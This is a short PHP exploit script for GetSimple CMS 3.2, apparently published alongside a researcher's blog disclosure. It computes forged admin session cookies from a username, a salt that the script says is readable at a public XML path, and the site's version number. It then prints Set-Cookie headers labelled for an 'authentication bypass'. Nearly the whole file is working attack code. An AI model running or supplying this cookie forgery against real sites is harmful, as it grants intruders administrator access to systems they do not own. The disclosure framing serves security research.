# GetSimple CMS authentication / cookie generation
# By carbonman @carbonmanx http://techblog.sunsetsurf.co.uk
# for all the details see http://techblog.sunsetsurf.co.uk/2013/03/getsimple-cms-password-authentication-bypass/
# example php GSCookieGen.php admin 12345678916 3.2
# secure your servers!
#
#

<?php
if ( count($argv) !=4 ) {
        echo "\n\n\n\nUsage: GSCookieGen.php [username] [salt] [versionnumber]\n";
        echo "By default salt is in http://site/data/other/authorization.xml\n";
        echo "I'm sure you can find the version number, i.e 3.2.1\n";
        echo "Please try again with the above arguements completed\n\n\n";
        exit();
}
$USR= $argv[1];
$SALT = $argv[2];
$saltUSR = $USR.$SALT;
$cookie_time='7200';
$site_full_name = 'GetSimple';
$site_version_no = $argv[3];
$name_url_clean = strtolower(str_replace(' ','-',$site_full_name));
$site_link_back_url = 'http://get-simple.info/';
$ver_no_clean = str_replace('.','',$site_version_no);
$cookie_name = strtolower($name_url_clean) .'_cookie_'. $ver_no_clean;
$saltcookie = sha1($cookie_name.$SALT);
$cookie = sha1($saltUSR);
echo "\n----------------------------\n\nUse the following to your http request for authentication bypass\n";
echo "Set-Cookie: ".$saltcookie."=".$cookie."\n";
echo "Set-Cookie: GS_ADMIN_USERNAME=".$USR."\n\n\n----------------------------\n\n\n";
?>